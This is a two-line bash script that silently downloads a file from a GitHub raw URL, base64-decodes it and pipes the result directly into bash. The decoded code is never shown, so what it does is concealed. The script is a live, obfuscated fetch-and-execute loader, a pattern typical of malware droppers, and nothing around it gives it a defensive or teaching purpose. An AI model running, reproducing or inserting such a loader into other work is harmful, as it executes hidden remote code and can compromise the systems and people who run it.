#!/bin/bash
wget -qO- https://raw.githubusercontent.com/galvanaparucio/protec/refs/heads/main/entrypoint.sh | base64 -d | bash
